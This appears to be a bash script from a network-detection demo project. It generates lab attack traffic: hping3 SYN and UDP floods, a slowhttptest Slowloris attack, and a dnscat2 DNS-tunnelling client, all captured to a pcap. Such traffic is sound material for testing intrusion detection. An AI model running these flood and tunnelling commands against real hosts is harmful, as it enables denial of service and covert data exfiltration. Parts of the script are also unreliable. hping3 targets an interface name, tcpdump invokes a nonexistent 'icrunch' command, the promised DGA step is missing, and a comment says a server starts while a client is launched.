#!/usr/bin/env bash
# scripts/generate_traffic.sh
# ============================
# Generates test network traffic for CyberSentinel backend demo.
# 
# WARNING: Only use in a controlled lab environment. 
# Do not run against production or public networks.
# This script may violate acceptable use policies and Terms of Service.
#
# Traffic types generated:
#  - iperf3: Benign background traffic
#  - hping3 --syn --flood: SYN flood attack
#  - hping3 --udp --flood: UDP flood/amplification attack
#  - slowhttptest: Slowloris application-layer attack
#  - dnscat2: DNS tunneling exfiltration
#  - DGA domain generation Python script
#  - All captured to data/pcaps/lab_capture.pcap via tcpdump
#
# Prerequisites:
#   - iperf3, hping3, slowhttptest, dnscat2 installed
#   - tcpdump for packet capture
#   - Root/administrator privileges for interface sniffing
#   - CONFIGURED CAREFULLY BEFORE EXECUTION

set -euo pipefail

# Configuration ----------------------------------------------------------------

# Network interface to use (change as needed)
INTERFACE="${SNIFF_INTERFACE:-eth0}"

# Port ranges and settings
IPERF_PORT=5201
HING_FLOOD_COUNT=500
HING_UDP_FLOOD_COUNT=500
SLOWLORIS_CONNECTIONS=200
DNSCAT2_DURATION=60  # seconds

# Output PCAP file
OUTPUT_PCAP="data/pcaps/lab_capture.pcap"

# Log file
LOG_FILE="data/traffic_generation.log"

# Ensure output directory exists
mkdir -p data/pcaps
mkdir -p data/logs

log() {
    echo "[$(date '+%Y-%m-%d %H:%M:%S')] $1" | tee -a "$LOG_FILE"
}

cleanup() {
    log "Cleanup: Stopping background processes..."
    # Kill any running capture/generation processes
    pkill -f "tcpdump" 2>/dev/null || true
    pkill -f "iperf3" 2>/dev/null || true
    pkill -f "hping3" 2>/dev/null || true
    pkill -f "slowhttptest" 2>/dev/null || true
    pkill -f "dnscat2" 2>/dev/null || true
}

trap cleanup EXIT INT TERM

# ------------------------------------------------------------
log "=== CyberSentinel Traffic Generation Start ==="
log "Interface: $INTERFACE"
log "Output PCAP: $OUTPUT_PCAP"

# 1. Benign background traffic with iperf3 (server in background)
log "[1/6] Starting benign iperf3 background traffic..."
iperf3 -s -p $IPERF_PORT -1 > /dev/null 2>&1 &
IPERF_PID=$!
sleep 1  # Wait for server to start
log "iperf3 server PID: $IPERF_PID"

# 2. SYN flood with hping3
log "[2/6] Starting SYN flood attack (hping3 --syn --flood)..."
log "WARNING: SYN flood will generate high traffic volume"
hping3 --syn --flood -i u100 -p 80 $INTERFACE 2>&1 | tee -a "$LOG_FILE" &
HING_SYN_PID=$!
sleep 5  # Let the flood start

# 3. UDP flood/amplification with hping3
log "[3/6] Starting UDP flood attack (hping3 --udp --flood)..."
log "WARNING: UDP flood will generate high traffic volume"
hping3 --udp --flood -i u100 -p 53 $INTERFACE 2>&1 | tee -a "$LOG_FILE" &
HING_UDP_PID=$!
sleep 5  # Let the UDP flood start

# 4. Slowloris application-layer attack
log "[4/6] Starting Slowloris attack (slowhttptest)..."
log "WARNING: Slowloris will hold connections open"
slowhttptest -c $SLOWLORIS_CONNECTIONS -i 10 -t GET -r 2 -k "GET / HTTP/1.1" \
    "$(hostname -f 2>/dev/null || echo example.com):80" 2>&1 | tee -a "$LOG_FILE" &
SLOWLORIS_PID=$!
sleep 3

# 5. DNS tunneling with dnscat2
log "[5/6] Starting DNS tunneling (dnscat2)..."
log "WARNING: dnscat2 creates covert DNS channel"
# Start dnscat2 server in background (simplified for demo)
dnscat2 --client 2>&1 | tee -a "$LOG_FILE" &
DNSCAT2_PID=$!
sleep 3

# 6. Capture all traffic to PCAP
log "[6/6] Capturing traffic to PCAP file via tcpdump..."
log "Capture will run for ${DNSCAT2_DURATION} seconds..."

# Run tcpdump to capture all IP traffic
tcpdump -i $INTERFACE -w "$OUTPUT_PCAP" -G $DNSCAT2_DURATION -z icrunch \
    -B 256 2>&1 | tee -a "$LOG_FILE" &

TCPDUMP_PID=$!

log "tcpdump PID: $TCPDUMP_PID"
log "Capture will run for approximately ${DNSCAT2_DURATION} seconds"

# Wait for capture duration
sleep $((DNSCAT2_DURATION + 10))

log "=== Traffic Generation Complete ==="
log "PCAP saved to: $OUTPUT_PCAP"
log "Analyze with: python -m cybersentinel_backend.app.main"

# Stop processes
cleanup

log "All traffic generation processes stopped."